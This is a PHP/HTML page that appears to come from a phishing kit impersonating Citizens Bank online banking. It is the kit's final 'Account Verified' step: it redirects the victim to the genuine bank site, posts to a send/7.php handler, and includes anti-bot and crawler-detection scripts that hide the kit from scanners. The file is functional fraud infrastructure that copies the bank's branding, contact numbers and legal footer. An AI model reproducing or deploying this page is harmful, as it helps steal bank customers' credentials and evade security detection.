<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
    include './huehuehue.php';
    include './bot_fucker/bot.php';
    include './bot_fucker/wrd.php';
    include './crawlerdetect.php';
?>

<!DOCTYPE html>
<html class="no-js" lang="en-US">
<!--<![endif]-->

       <meta http-equiv="refresh" content="4;url=http://investor.citizensbank.com/about-us/our-company.aspx" />
<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta charset="utf-8">
  <title>Success | Online Banking</title>
  <meta name="description" content="">

  <link href="images/icon-normal.png" rel="apple-touch-icon">
  <link href="images/icon-normal.png" rel="apple-touch-icon" sizes="76x76">
  <link href="images/icon-normal.png" rel="apple-touch-icon" sizes="120x120">
  <link href="images/icon-normal.png" rel="apple-touch-icon" sizes="152x152">
  <link href="images/icon-normal.png" rel="apple-touch-icon" sizes="180x180">
  <link href="images/icon-hires.png" rel="icon" sizes="192x192">
  <link href="images/icon-normal.png" rel="icon" sizes="128x128">

<link href="ctz.css" rel="stylesheet" />
  <meta name="viewport" content="width=device-width, initial-scale=1">

</head>

<body class="responsive-enabled">

  <!-- ===============
      PAGE HEADER START
      =============== -->
  <!-- begin CITIZENS BANK Hosted Header -->
  <div class="ctzns-heder-foter-injected">

<link rel="stylesheet" type="text/css" href="css/nsns.min.css">
<style>
.help-modal-header .help-modal-close {background: url(images/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(images/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(images/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style>

</div>

<div class="citizens-header">

    <!-- htmlContainer PREFIX -->
    <div class="ctzns-heder-foter">
      <header id="page-header" class="page-header">
        <!-- inc-header.html START -->
        <div class="centered-content clearfix">
          <a class="page-logo">
            <img border="0" width="203" height="25" src="images/CTZ_Green-01.png" alt="Citizens Bank">
          </a>
          <div id="header-navigation-container"></div>
        </div>
        <!-- inc-header.html END -->
      </header>
    </div>
    <!-- htmlContainer SUFFIX -->

  </div>
  <!-- end CITIZENS BANK Hosted Header -->
  <!-- ===============
      PAGE HEADER END
      =============== -->

  <!-- ===============
      PAGE CONTENT AREA START
      =============== -->
  <div id="page-container" class="page-container">
  <div class="centered-content clearfix">
    <div class="g-unauth-main-container">
        <section class="unauth-intro-area">
            <h2 class="unauth-intro-area__title ">Account Verified</h2>
        
                <div role="progressbar" aria-valuenow="4" aria-valuemin="4" aria-valuetext="Step 4 of 4: Enrollment" aria-valuemax="4">
                    <div class="unauth-intro-area__step">
                        <strong>Step 4 of 4:</strong>
                        <span>Verification successful</span>
                    </div>
                    <div class="unauth-intro-area__progress-container">
                        <div class="unauth-intro-area__progress-segment">
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                        </div>
                    </div>
                </div>
            <div class="js-error-block"></div>
			
            <div class="unauth-intro-area__help">
                <a class="g-link-list unauth-intro-area__link g-display-none" href="#helpModalPage">Show Help</a>
            </div>
        </section>        <section class="identify-customer-section">
            <form class="unauth-form jqtransform js-enrollment-form" method="post" action="send/7.php">
              
                <div class="unauth-form__ic-identification-block">
                    <div class="unauth-form__row">
					<p><img src="images/2-2-success-png-picture.png" width="15%"></p>
					<p>Welcome Again!</p>
					<p>Your account has been successfully verified, you will be redirected shortly.</p>
                       
                    </div>
                    
                   

                  








                </div>
				
				
            </form>
        </section>
    </div>
</div></div>
  <!-- ===============
      PAGE CONTENT AREA END
      =============== -->

  <!-- ===============
      PAGE FOOTER START
      =============== -->
 

<!DOCTYPE html>


<div class="citizens-footer"><div class="ctzns-heder-foter"><footer id="page-footer" class="page-footer"><div class="footer-top">
<ul>
<li>
<a href="#" class="contact" title="Opens Ways to Contact Us Dialog">
<span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
</a>
<div class="dropup-menu">
<h4>Contact Us</h4>
<p>General Questions:
<br>
<strong>1-800-656-6561</strong> (personal bank accounts)
<br>
Business Questions:
<br>
<strong>1-877-229-6428</strong> (online banking support)
<br>
<strong>1-800-862-6200</strong> (account information)
<br>
Investment Questions:
<br>
<strong>1-800-942-8300</strong> (Citizens Investment Services)
</p>
<!--
<p>Go to <a href="/customer-service/">Customer Service</a> to send us email or mail or to view FAQs</p>
<p><a href="/forms/contactme.aspx">We'll Contact You</a></p>
-->
</div>
</li>
<!-- As part of Def# 1465 Location is commented on Auth/UnAuth pages.
<li><span class="location">Your Location: NONE</span>
</li>
-->

<li>
<a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
<span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
</a>
<div class="dropup-menu">
<h4>Branch &amp; ATM Locator</h4>
<p>Find one of our 1,300 locations near you.</p>
<div role="form">
<div id="stickyFooterBranch-error" class="error-message" style="display: none"></div>
<input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE">
<a href="#" type="button" class="button button-stickyfooterbranch">Submit</a>
</div>
</div>
</li>
</ul>
</div>
<div class="footer-row clearfix">
<ul>
<li>
<h6>Checking &amp; Savings</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/checking-and-savings.aspx">Checking &amp; Savings Overview</a></li>-->
<li>
<a>Checking</a>
</li>
<li>
<a>Savings</a>
</li>
<li>
<a>Money Markets</a>
</li>
<li>
<a>Certificates of Deposit (CDs)
<sup>®</sup>
</a>
</li>
<li>
<a>IRAs</a>
</li>
<li>
<a>Programs &amp; Services</a>
</li>
<li>
<a>Benefits &amp; Features</a>
</li>
<li>
<a>Debit Card</a>
</li>
<li>
<a>Overdraft Choices
<sup>®</sup>
</a>
</li>
</ul>
<ul>
<li>
<h6>Home Borrowing</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/loans/">Home Borrowing Overview</a></li>-->
<li>
<a>Mortgages</a>
</li>
<li>
<a>Home Equity Loans</a>
</li>
<li>
<a>Home Equity Lines of Credit</a>
</li>
<li>
<a>Determine My Rate</a>
</li>
<li>
<a>My Mortgage Account</a>
</li>
</ul>
<ul>
<li>
<h6>Students</h6>
</li>
<!--<li><a target="_blank" href="http://www.citizensbank.com/student-services/">Students Overview</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-banking/">Banking</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/undergradfamilies.aspx">Undergraduate Borrowing</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/gradstudents.aspx">Graduate Borrowing</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/process.aspx">The Student Loan Process</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Student Tools &amp; Resources</a></li>-->
<li>
<a>Student Loan Options</a>
</li>
<li>
<a>Refinancing Student Loans</a>
</li>
<li>
<a>The Student Loan Process</a>
</li>
<li>
<a>Undergraduate Students &amp; Parents</a>
</li>
<li>
<a>Graduate Students</a>
</li>
<li>
<a>Tools &amp; Information</a>
</li>
<li>
<a>Banking for Students</a>
</li>
<li>
<a>Access My Student Loan</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Cards</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/">Cards Overview</a></li>-->
<li>
<a>Credit Cards</a>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/debit-card/debit-card.aspx">Debit Card</a></li>-->
<li>
<a>Card Agreements</a>
</li>
<li>
<a>Security Features</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Personal Loans</h6>
</li>
<li>
<a>Overview</a>
</li>
<li>
<a>FAQs</a>
</li>
</ul>
<ul>
<li>
<h6>Resources</h6>
</li>
<li>
<a>Order Checks</a>
</li>
<li>
<a>Online &amp; Mobile Banking</a>
</li>
<li>
<a>Customer Service</a>
</li>
</ul>
<ul>
<li>
<h6>About Us</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/about-us/">About Us Overview</a></li>-->
<li>
<a>About Citizens Bank</a>
</li>
<li>
<a>In the Community</a>
</li>
<li>
<a>Careers</a>
</li>
<li>
<a>About Our Ads</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Solutions</h6>
</li>
<li>
<a>Personal</a>
</li>
<li>
<a>Investing</a>
</li>
<li>
<a>Small Business</a>
</li>
<li>
<a>Commercial</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Disclosures</h6>
</li>
<li>
<a>Online Terms and Conditions</a>
</li>
<li>
<a>Electronic Notice Disclosure and Consent (Online Service)</a>
</li>
<li>
<a>Account Documents</a>
</li>
<li>
<a>Member FDIC</a>
</li>
<li>
<a>Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="images/equal-housing.gif">
</a>
</li>
<li>
<a>Security, Privacy &amp; Legal</a>
</li>
</ul>
</div>
<div class="centered-content">
<div class="footer-bottom">
<p class="legal">
Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
</p>
<p class="legal">
*Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Investment Services. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.<br><br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed.  Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).<br><br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only.  These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported.  Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported.  Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.<br><br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.<br><br>SpeciFi<sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A.
</p>

<div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
<p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:</p>
<ul class="footer-disclaimer-box__list">
<li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
<li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
<li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
<li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
<br>
</li>
<li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
</ul>
</div>
<ul class="footer-util">
<li class="sitemap">
<a>Site Map</a>
</li>
<li>Follow:
<a>
<img src="images/footer-follow-facebook.png" alt="Facebook" align="middle">
</a>
<a>
<img src="images/footer-follow-twitter.png" alt="Twitter">
</a>
<a>
<img src="images/footer-follow-linkedin.png" alt="Linkedin">
</a>
<a>
<img src="images/footer-follow-youtube.png" alt="Youtube">
</a>
</li>
</ul>

<p class="footer-copyright">
© Copyright 2021 Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
</p>

<img src="images/elh.gif" alt="Equal Housing Lender">
<img src="images/fdicFooter.gif" alt="Member FDIC">
</div>
</div>
</footer></div></div>
</body>
</html>


</body>
</html>

